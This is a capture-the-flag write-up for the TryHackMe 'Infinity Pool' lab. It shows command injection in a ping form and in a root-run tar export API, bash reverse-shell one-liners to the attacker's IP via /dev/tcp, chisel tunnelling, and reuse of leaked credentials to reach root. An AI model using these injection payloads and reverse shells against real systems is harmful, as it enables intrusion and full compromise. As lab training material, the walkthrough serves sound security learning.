<div align="center">
<img src="https://tryhackme.com/_next/image?url=https%3A%2F%2Fcdn-images.tryhackme.com%2Froom-icons%2F5dbea226085ab6182a2ee0f7-1785251854806&w=96&q=75" width="150">

# Infinity Pool

#Web #Boot2Root

</div>

---


```bash
nmap -sV -sC 10.113.179.237 -oN nmap.txt
```

I can find gunicorn running a http server on port 80. Python based!

We have 2 disallowed entries in robots:
* `/internal`
* `/status`

On the index page I can find a `static/app.js` which contains this:
```
// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
console.log("Stay Noticed\u2122");
```

Cool, `\u2122` creates the TM (trademark) symbol.

I navigate to the `/status` directory and can enter an IP to check for "sister-property connectivity":

![temp](assets/20260811084025.png)

I can ping myself.

If I enter `-c 3` (count = 3) I can ping myself three times, this indicates that some RCE might be possible.

![temp](assets/20260811084111.png)

```bash
c -3 192.168.192.185; ls
```

![temp](assets/20260811084139.png)

Yup, I should be able to get a shell here.

```bash
-c 1 192.168.192.185; bash -c "bash -i >& /dev/tcp/192.168.192.185/1337 0>&1"
```

I get a shell!

![temp](assets/20260811084340.png)

I can find the user flag inside `/home/web/user.txt`:

```
THM{REDACTED}
```

I upgrade my shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z 
stty raw --echo; fg
export TERM=xterm
```

I cannot check sudo perms (no password).

By checking `ps auxww` I can find something running as svc-watchtower on `localhost:3000`.

Also something running as root on port 9000.

I curl the website on port 3000 and copy the code onto my machine, this is what it looks like:

![temp](assets/20260811085426.png)

The service endpoints: `/api/health` and `/api/config` are interesting.


On the target machine:
```bash
curl localhost:3000/api/config
```

```json
{"automation_endpoint":"http://127.0.0.1:9000",
"note":"internal network only -- do not expose",
"ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
"telephony_pass":"St4yN0t1c3d_2026",
"telephony_portal":"http://127.0.0.1:8080/ucp",
"telephony_user":"FreePBXUCPTemplateCreator"}
```

I will now use chisel to forward the `telephony_portal` on port 8080 to my local machine:

First I need to get it onto the target (client machine), I do so with a simple python server and curl it from the target.
* Dont forget to make it executable: `chmod +x`. 

Attacker (local machine):
```bash
chisel server --reverse --port 8080
```

Target (client machine):
```bash
./chisel client 192.168.192.185:8080 R:9090:127.0.0.1:8080
```

On my attacker machine `http://localhost:9090/ucp/`.
![temp](assets/20260811093840.png)

I log in with the credentials above:

![temp](assets/20260811093942.png)

I navigate to `http://localhost:9090/admin/config.php` (Redirected from /admin):

![temp](assets/20260811094510.png)


When clicking "FreePBX Administration" I have to log in, but the credentials do not work here. Do I need to set a new password?

I go to `http://localhost:9090/ucp/` and click the gear at the bottom left, account settings and update the password to: newpass123

It does not work...

When clicking around at the ucp dashboard I add a widget for `voicemail` and find this:

```
"Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
```

I remember the "automation endpoint" on port 9000 that is running as root from the process:

```
root         909  0.0  0.7  42416 29944 ?        S    06:32   0:00 /var/www/infinity_pool/automation/venv/bin/python3 /var/www/infinity_pool/automation/venv/bin/gunicorn --workers 1 --bind 127.0.0.1:9000 wsgi:app
```

I use chisel again:

Client (target machine):
```bash
./chisel client 192.168.192.185:9000 R:9090:127.0.0.1:9000
```

Attacker (host machine):
```bash
./chisel server --reverse --port 9000
```

I now use feroxbuster against my `localhost:9090`:

```bash
feroxbuster http://localhost:9090
```
![temp](assets/20260811102241.png)

I find `/jobs/export` with the error code 405 (Method not allowed). So I have to POST to it?


Attacker (local / host machine):
```bash
curl -X POST http://localhost:9090/jobs/export 
> {"error":"missing or invalid bearer token"}

curl -X POST http://localhost:9090/jobs/export -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a'
> {"error":"field 'report' is required"}

curl -X POST http://localhost:9090/jobs/export -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' -H 'Content-Type: application/json' -d '{"report":"test"}'

> {"command":"tar czf /var/automation/exports/test.tgz /var/automation/data 2>&1","output":"tar: Removing leading `/' from member names\n"}
```

It looks like it tries to unzip the test file?

```bash
curl -X POST http://localhost:9090/jobs/export -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' -H 'Content-Type: application/json' -d '{"report":"test; echo hello"}'

> {"command":"tar czf /var/automation/exports/test; echo hello.tgz /var/automation/data 2>&1","output":"hello.tgz /var/automation/data\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\n"}'
```


On the target machine:
```bash
curl -X POST http://localhost:9000/jobs/export -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' -H 'Content-Type: application/json' -d '{"report":"test; bash -c \"bash -i >& /dev/tcp/192.168.192.185/1338 0>&1\" #"}'
```
use `;<reverse_shell>` to escape the command, also `#` to comment out everything behind.

IT WORKED!! Since the process on port 9000 is running as root, I no have a root shell!

```bash
cat /root/root.txt
THM{<REDACTED>}
```
